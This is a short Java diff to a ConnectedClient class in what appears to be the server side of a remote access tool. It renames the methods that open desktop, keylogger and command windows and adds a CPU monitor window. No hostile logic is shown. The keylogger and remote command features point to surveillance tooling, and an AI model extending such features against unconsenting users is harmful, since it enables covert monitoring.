@@ -1,10 +1,7 @@
 package Server;
 
 import Server.Exception.ClientDisconnectedException;
-import Server.GUI.GuiCommand;
-import Server.GUI.GuiDesktop;
-import Server.GUI.GuiKeyLogger;
-import Server.GUI.GuiText;
+import Server.GUI.*;
 import Ultils.MessageType;
 import Ultils.NetUtils;
 import Ultils.Packet;
@@ -34,6 +31,7 @@ public class ConnectedClient{
     private GuiDesktop desktop;
     private GuiKeyLogger keylogger;
     private GuiCommand command;
+    private GuiCPU cpu;
 
     public ConnectedClient(Socket socket) throws IOException {
         this.lastIP = socket.getInetAddress().getHostAddress();
@@ -110,25 +108,32 @@ public class ConnectedClient{
         Server.getInstance().removeClient(this);
     }
 
-    public void openDesktopView() {
+    public void OpenDesktopView() {
         if (this.desktop == null) {
             this.desktop = new GuiDesktop(this);
         }
         this.desktop.setVisible(true);
     }
 
-    public void openKeyLogView() {
+    public void OpenKeyLogView() {
         if (this.keylogger == null) {
             this.keylogger = new GuiKeyLogger(this);
         }
         this.keylogger.setVisible(true);
     }
 
-    public void openCommandView() {
+    public void OpenCommandView() {
         if (this.command == null) {
             this.command = new GuiCommand(this);
         }
         this.command.setVisible(true);
+    }
+
+    public void OpenCpuView() {
+        if (this.cpu == null) {
+            this.cpu = new GuiCPU(this);
+        }
+        this.cpu.setVisible(true);
     }
 
     public void SendShutDown(PrintWriter pw) {
